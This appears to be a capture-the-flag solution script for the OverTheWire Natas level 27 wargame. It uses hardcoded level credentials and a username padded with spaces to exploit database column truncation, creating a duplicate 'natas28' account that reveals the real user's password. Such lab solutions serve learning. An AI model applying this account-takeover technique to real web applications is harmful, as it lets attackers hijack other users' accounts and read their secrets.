import requests

URL = "http://natas27.natas.labs.overthewire.org/index.php"
CREDS = ("natas27", "55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ")

s = requests.Session()
s.auth = CREDS

username = "natas28%sa" % (" " * 64)
password = "test"

params = {"username": username, "password": password}

s.get(URL, params=params)

params = {"username": "natas28", "password": password}

print(s.get(URL, params=params).text)
